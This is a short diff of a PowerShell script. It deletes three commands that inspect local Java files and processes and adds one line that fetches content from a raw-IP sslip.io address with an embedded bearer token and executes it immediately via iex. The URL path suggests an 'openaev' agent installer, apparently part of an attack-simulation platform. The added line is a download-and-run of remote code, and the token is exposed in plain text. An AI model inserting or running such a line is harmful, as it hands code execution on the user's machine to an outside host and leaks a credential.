@@ -1,3 +1,1 @@
-dir $env:USERPROFILE\Downloads\*.jar
-dir $env:LOCALAPPDATA\Sun\Java\Deployment\cache -Recurse
-gps javaw
+iex (iwr -Headers @{Authorization="Bearer 6e523e36-67ad-4f5a-9e54-473c234e33cc"} https://152.53.191.229.sslip.io/api/tenants/2cffad3a-0001-4078-b0e2-ef74274022c3/agent/installer/openaev/windows/session-user).Content
